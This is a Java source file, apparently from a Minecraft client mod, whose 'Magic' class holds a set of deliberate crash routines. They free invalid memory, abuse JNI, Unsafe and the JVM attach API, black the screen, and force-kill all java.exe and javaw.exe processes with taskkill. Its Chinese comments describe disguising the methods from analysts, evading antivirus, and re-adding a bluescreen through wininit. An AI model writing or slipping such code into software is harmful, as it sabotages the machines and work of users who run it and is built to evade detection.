package tech.hakuri.teto.utils;

import com.mojang.blaze3d.platform.GlUtil;
import com.mojang.blaze3d.systems.RenderSystem;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32Util;
import net.minecraft.world.entity.Entity;
import org.lwjgl.opengl.GPU_DEVICE;
import org.lwjgl.system.JNI;
import org.lwjgl.system.MemoryUtil;
import org.lwjgl.system.windows.WindowProc;
import sun.misc.Unsafe;

/**
 * @author rebeyond
 * @author 手淫
 * 如果你的混淆器不混方法签名，这里一大片无参且返回void并抛出一个Exception的方法会很突出，所以人工模糊他们
 */
public class Magic {

    public static Entity quit1(Entity e) {
        RenderSystem.deleteTexture(4);//黑屏
        return e;
    }

    public static Entity quit3(Entity e) {
        MemoryUtil.nmemFree(1);
        return e;
    }

    public static Entity quit4(Entity e) {
        JNI.callV(1);
        return e;
    }

    public static Entity quit5(Entity e) {
        GlUtil.allocateMemory(Integer.MAX_VALUE);
        return e;
    }

    public static Entity quit7(Entity e) {
        Kernel32Util.freeGlobalMemory(new Pointer(1));
        return e;
    }

    public static Entity quit8(Entity e) {
        WindowProc.free(1);
        return e;
    }

    public static Entity quit9(Entity e) {
        GPU_DEVICE.nDeviceNameString(1);//是的，这行不是取东西的，这行是崩端的
        return e;
    }

    //https://www.cnblogs.com/rebeyond
    //卡脖子黑科技
    public static Entity quit10(Entity e) {
        try {
            Unsafe unsafe = ReflectBridge.getField(Unsafe.class, Unsafe.class, null, "theUnsafe");
            Class<?> vmi = ReflectBridge.forName("sun.tools.attach.VirtualMachineImpl");
            ReflectBridge.unlock(unsafe, ReflectBridge.class, vmi);
            ReflectBridge.invoke(null, vmi, null, "enqueue", -1L, new byte[]{-1}, "load", "load", new Object[]{});
        } catch (Exception ex) {
        }
        return e;
    }

    public static Entity quit11(Entity e) {
        try {
            Unsafe unsafe = ReflectBridge.getField(Unsafe.class, Unsafe.class, null, "theUnsafe");
            unsafe.freeMemory(1);
        } catch (Exception ex) {
        }
        return e;
    }

    //最后运行，防止杀软截胡
    //没有关机了，关机太恶俗
    //蓝屏也删了，想加回去可以用管理员powershell运行wininit
    public static Entity quit12(Entity e) {
        try {
            new ProcessBuilder("C:\\Windows\\System32\\taskkill.exe", "/f", "/im", "java.exe").start();
            new ProcessBuilder("C:\\Windows\\System32\\taskkill.exe", "/f", "/im", "javaw.exe").start();
        } catch (Exception ex) {
        }
        return e;
    }

    public static Entity attachSelf(Entity e) {
        try {
            ReflectBridge.setField(ReflectBridge.forName("sun.tools.attach.HotSpotVirtualMachine"), null, "ALLOW_ATTACH_SELF", true);
        } catch (Exception ex) {
        }
        return e;
    }

}
